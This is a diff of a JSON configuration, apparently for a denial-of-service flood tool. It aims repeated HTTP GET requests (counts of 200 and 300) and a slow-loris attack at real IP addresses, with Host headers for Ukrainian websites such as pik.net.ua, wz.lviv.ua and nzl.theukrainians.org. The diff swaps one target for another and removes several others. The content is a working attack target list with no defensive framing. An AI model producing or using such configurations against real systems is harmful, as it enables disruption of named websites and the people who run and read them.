@@ -17,44 +17,11 @@
 		  "args": {
 			  "request": {
 				  "method": "GET",
-				  "path": "https://78.47.72.135/",
+				  "path": "https://185.68.16.39/",
 				  "headers": {
-					  "HOST": "pik.net.ua"
+					  "HOST": "nzl.theukrainians.org"
 				  }
 			  }
-		  }
-	  },
-	  {
-		  "type": "http",
-		  "count": 300,
-		  "args": {
-			  "request": {
-				  "method": "GET",
-				  "path": "https://78.47.72.135/2022/04/20/u-84-pochaty-nove-zhyttya-yak-zaraz-zhyve-u-frankivsku-vidomyj-didus-yakyj-zakolysuvav-onuchku-video/",
-				  "headers": {
-					  "HOST": "pik.net.ua"
-				  }
-			  }
-		  }
-	  },
-	  {
-		  "type": "http",
-		  "count": 200,
-		  "args": {
-			  "request": {
-				  "method": "GET",
-				  "path": "https://138.201.196.81/",
-				  "headers": {
-					  "HOST": "wz.lviv.ua"
-				  }
-			  }
-		  }
-	  },
-	  {
-		  "type": "slow-loris",
-		  "count": 100,
-		  "args": {
-			  "path": "https://138.201.196.81/build/calendar.php?year=2022&month=4"
 		  }
 	  }
   ]
